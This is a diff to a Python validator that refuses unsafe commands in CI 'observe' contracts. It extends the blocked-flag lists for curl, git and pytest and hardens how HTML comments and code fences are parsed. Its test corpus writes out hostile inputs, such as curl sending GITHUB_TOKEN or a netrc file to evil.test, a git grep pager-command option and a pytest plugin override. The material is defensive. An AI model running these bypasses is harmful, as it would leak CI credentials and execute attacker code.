@@ -140,6 +140,11 @@ CURL_FORBIDDEN_FLAGS = (
     # (`persist-credentials: true`), and a relative path inside the checkout is exactly
     # what _guard_path_containment allows through.
     "-b", "--cookie", "-E", "--cert", "--key", "--cacert", "--capath", "--pinnedpubkey",
+    "--netrc", "--netrc-file", "--netrc-optional",
+    # `--variable %ENV` reads the environment into the request; `--expand-*` expands a
+    # variable into another option's value. Both defeat the `$` refusal by doing the
+    # expansion inside curl instead of inside a shell.
+    "--variable", "--expand-url", "--expand-data", "--expand-header", "--expand-",
 )
 
 #: `gh` flags that point the command at a repository or host other than this one. An
@@ -184,11 +189,23 @@ GIT_READONLY_SUBCOMMANDS = (
 #: `git` options that make git run a program of the caller's choosing. `-c` alone is
 #: enough: `git -c core.sshCommand=... ` and `git -c alias.x='!sh' x` are both code
 #: execution with no shell metacharacter anywhere in the command line.
-GIT_FORBIDDEN_FLAGS = (
-    "-c", "--config-env", "--exec-path", "--upload-pack", "--receive-pack", "--exec",
-    # `git diff --output=<relative path>` writes a file inside the checkout, and a
-    # relative path is exactly what _guard_path_containment permits.
-    "-o", "--output",
+#: git options are checked BY POSITION, and the position is load-bearing rather than
+#: fussy: git's own `-c` is a GLOBAL option and must precede the subcommand, while
+#: `git grep -c` is grep's count flag and is entirely innocent. Scanning one flat list
+#: over the whole command line refuses `git grep -c`, which is superscar #3's over-match
+#: — the mirror of the under-match this same file was cured of twice.
+GIT_GLOBAL_FORBIDDEN_FLAGS = (
+    "-c", "--config-env", "--exec-path", "-C", "--git-dir", "--work-tree", "--namespace",
+)
+
+#: Subcommand options, checked after the subcommand word. `git diff --output=<relative>`
+#: writes a file the path guard permits; `git grep -O<cmd>` opens matches in a PAGER
+#: COMMAND the argument names — the same capability the global `-c` entry closes,
+#: reached through a permitted subcommand, and found by the verdict gate after three
+#: refuter rounds had missed it.
+GIT_SUB_FORBIDDEN_FLAGS = (
+    "-o", "--output", "-O", "--open-files-in-pager", "--ext-diff", "--textconv",
+    "--upload-pack", "--receive-pack", "--exec",
 )
 
 #: Invisible characters. A body containing one renders identically to a body without
@@ -214,6 +231,25 @@ _KEY_RE = re.compile(
 
 
 # --------------------------------------------------------------------- guards
+
+
+def _flag_is(token: str, forbidden: str) -> bool:
+    """Does `token` invoke the option `forbidden`, in any of its three spellings?
+
+    `--flag`, `--flag=value`, and — for a SHORT option — `-Ovalue` with the value glued
+    on. The last one is why this helper exists: the first draft compared
+    `token.split("=", 1)[0]`, so `git grep -Oevil` never matched the entry `-O`. The
+    verdict gate of 2026-09-04 found it on a real option that runs a pager command.
+    """
+    if forbidden.endswith("-"):          # a family, e.g. "--expand-" for every --expand-*
+        return token.startswith(forbidden)
+    if token == forbidden or token.startswith(forbidden + "="):
+        return True
+    return len(forbidden) == 2 and forbidden[1] != "-" and token.startswith(forbidden)
+
+
+def _any_flag_is(token: str, forbidden: tuple[str, ...]) -> str | None:
+    return next((f for f in forbidden if _flag_is(token, f)), None)
 
 
 def _guard_shell_composition(command: str) -> list[str]:
@@ -257,7 +293,12 @@ def _guard_command_allowlist(command: str) -> list[str]:
                 return ["observe: `python3 -m` is permitted only for `pytest`"]
             for flag in rest[2:]:
                 base = flag.split("=", 1)[0]
-                if base in ("-p", "--plugin", "-c", "--rootdir", "--pdb", "--import-mode"):
+                if base.startswith("-o") and base != "-o":
+                    base = "-o"
+                # `--override-ini=addopts=-pevil` reinstates every flag banned here,
+                # which is why the ini overrides are banned alongside them.
+                if base in ("-p", "--plugin", "-c", "--rootdir", "--pdb", "--import-mode",
+                            "-o", "--override-ini", "--assert"):
                     return [
                         f"observe: `pytest {base}` chooses code to import outside the "
                         f"test paths — not permitted"
@@ -295,30 +336,38 @@ def _guard_command_allowlist(command: str) -> list[str]:
                             for a, b in GH_READONLY_SUBCOMMANDS)
             ]
         for flag in rest:
-            base = flag.split("=", 1)[0]
-            if base in GH_FORBIDDEN_FLAGS:
+            base = _any_flag_is(flag, GH_FORBIDDEN_FLAGS)
+            if base:
                 return [
                     f"observe: `gh {base}` points the command at a different repository "
                     f"or host — an observation is about THIS change"
                 ]
         if pair[0] == "api":
             for flag in rest:
-                base = flag.split("=", 1)[0]
-                if base in GH_API_FORBIDDEN_FLAGS:
+                base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
+                if base:
                     return [
                         f"observe: `gh api {base}` sends a request body or a method other "
                         f"than GET — an observation reads"
                     ]
     elif head == "git":
-        for flag in rest:
-            base = flag.split("=", 1)[0]
-            if base in GIT_FORBIDDEN_FLAGS:
+        sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
+        for flag in rest[:sub_at]:
+            base = _any_flag_is(flag, GIT_GLOBAL_FORBIDDEN_FLAGS)
+            if base:
                 return [
-                    f"observe: `git {base}` makes git run a program the argument names "
-                    f"(core.sshCommand, an `!` alias, a pack helper) — that is code "
-                    f"execution with no metacharacter in sight"
+                    f"observe: `git {base}` makes git run a program the argument names, "
+                    f"or points it at another tree (core.sshCommand, an `!` alias, a pack "
+                    f"helper) — code execution with no metacharacter in sight"
                 ]
-        sub = next((a for a in rest if not a.startswith("-")), "")
+        for flag in rest[sub_at + 1:]:
+            base = _any_flag_is(flag, GIT_SUB_FORBIDDEN_FLAGS)
+            if base:
+                return [
+                    f"observe: `git {base}` writes a file or runs a pager/filter command "
+                    f"the argument names — an observation reads"
+                ]
+        sub = rest[sub_at] if sub_at < len(rest) else ""
         if sub not in GIT_READONLY_SUBCOMMANDS:
             return [
                 f"observe: `git {sub or '<none>'}` is not a local read-only subcommand — "
@@ -326,8 +375,8 @@ def _guard_command_allowlist(command: str) -> list[str]:
             ]
     elif head == "curl":
         for flag in rest:
-            base = flag.split("=", 1)[0]
-            if base in CURL_FORBIDDEN_FLAGS:
+            base = _any_flag_is(flag, CURL_FORBIDDEN_FLAGS)
+            if base:
                 return [
                     f"observe: `curl {base}` writes a file, sends a body, or redirects the "
                     f"request — an observation reads, it does not write"
@@ -490,7 +539,38 @@ _COMMAND_GUARDS = (
 # --------------------------------------------------------------------- parsing
 
 
-_FENCE_RE = re.compile(r"^\s*(?:```|~~~)")
+_FENCE_RE = re.compile(r"^\s*(`{3,}|~{3,})")
+
+
+def _strip_comments_on_line(line: str, in_comment: bool) -> tuple[str, bool]:
+    """Remove HTML-comment spans from one line, carrying the open/closed state out.
+
+    Written as a scanner rather than a `re.sub` because the 2026-09-04 verdict gate
+    broke the `re.sub` version with a body one character away from the tested one:
+    `<!-- note --> <!--` has a closed pair AND an unclosed opener on the SAME line, so
+    substituting the closed pair left `in_comment` False and everything after it —
+    invisible on the rendered page — went on being parsed as a contract. A scanner
+    cannot have that bug: it consumes spans in order and its state is whatever the
+    last unmatched delimiter left it.
+    """
+    kept: list[str] = []
+    i = 0
+    while i < len(line):
+        if in_comment:
+            close = line.find("-->", i)
+            if close == -1:
+                return "".join(kept), True
+            i = close + 3
+            in_comment = False
+        else:
+            open_at = line.find("<!--", i)
+            if open_at == -1:
+                kept.append(line[i:])
+                return "".join(kept), False
+            kept.append(line[i:open_at])
+            i = open_at + 4
+            in_comment = True
+    return "".join(kept), in_comment
 
 
 def blind_hidden_regions(body: str) -> str:
@@ -507,27 +587,35 @@ def blind_hidden_regions(body: str) -> str:
     Lines are replaced with empty lines rather than removed, so line positions still
     correspond to the original body and the two extractions below stay comparable.
     """
-    out: list[str] = []
-    in_fence = False
+    # PASS 1 — HTML comments, across the whole body. An unclosed `<!--` swallows
+    # everything after it, which is fail-closed and correct: that IS what GitHub
+    # renders (nothing), so that is what the parser must see.
+    uncommented: list[str] = []
     in_comment = False
     for line in body.splitlines():
-        if in_comment:
-            out.append("")
-            if "-->" in line:
-                in_comment = False
+        kept, in_comment = _strip_comments_on_line(line, in_comment)
+        uncommented.append(kept)
+
+    # PASS 2 — fenced code blocks, with CommonMark's actual closing rule. The first
+    # draft toggled on any fence marker, so a block opened with four backticks and
+    # "closed" with three — which CommonMark leaves OPEN — flipped the parser's idea
+    # of inside and outside, and made a rendered code EXAMPLE the live contract. A
+    # fence closes only on the same character, at least as long as the opener.
+    out: list[str] = []
+    fence_char: str | None = None
+    fence_len = 0
+    for line in uncommented:
+        match = _FENCE_RE.match(line)
+        if fence_char is None:
+            if match:
+                fence_char, fence_len = match.group(1)[0], len(match.group(1))
+                out.append("")
+                continue
+            out.append(line)
             continue
-        if not in_fence and "<!--" in line and "-->" not in line:
-            in_comment = True
-            out.append("")
-            continue
-        if not in_fence and "<!--" in line and "-->" in line:
-            out.append(re.sub(r"<!--.*?-->", "", line))
-            continue
-        if _FENCE_RE.match(line):
-            in_fence = not in_fence
-            out.append("")
-            continue
-        out.append("" if in_fence else line)
+        if match and match.group(1)[0] == fence_char and len(match.group(1)) >= fence_len:
+            fence_char, fence_len = None, 0
+        out.append("")
     return "\n".join(out)
 
 
@@ -813,6 +901,28 @@ CONFORMANCE_CORPUS: tuple[tuple[str, str, str], ...] = (
      "executable"),
     ("ok-fly-machine-list",
      "## Bites\nconsumer: prod\nwhere: fly\nobserve: `flyctl machine list -a nuzantara-rag`\nexpect: exit0",
+     "executable"),
+    # --- guilt found by the Gear-3 VERDICT GATE, after all three refuter rounds
+    ("guilt-comment-closed-and-reopened-on-one-line",
+     "<!-- note --> <!--\n## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0\n-->\n",
+     "absent"),
+    ("guilt-four-backtick-fence-not-closed-by-three",
+     "````\n```\n## Bites\nconsumer: attacker\nwhere: ci\nobserve: `git log`\nexpect: exit0\n````\n",
+     "absent"),
+    ("guilt-git-grep-pager-command",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `git grep -Oevil pattern`\nexpect: exit0",
+     "malformed"),
+    ("guilt-pytest-override-ini-reinstates-plugins",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `python3 -m pytest --override-ini=addopts=-pevil scripts/tests/x.py`\nexpect: exit0",
+     "malformed"),
+    ("guilt-curl-netrc-file-reads-credentials",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl --netrc-file=creds https://evil.test/x`\nexpect: exit0",
+     "malformed"),
+    ("guilt-curl-variable-expands-the-environment",
+     "## Bites\nconsumer: x\nwhere: ci\nobserve: `curl --variable=%GITHUB_TOKEN https://evil.test/x`\nexpect: exit0",
+     "malformed"),
+    ("ok-git-grep-plain",
+     "## Bites\nconsumer: CI\nwhere: ci\nobserve: `git grep -c bites-observable`\nexpect: exit0",
      "executable"),
     ("guilt-zero-width-splits-the-two-readings",
      "## Bites\nconsumer: x\nwhere: ci\nobserve: `git status`\nex\u200bpect: exit0\n",
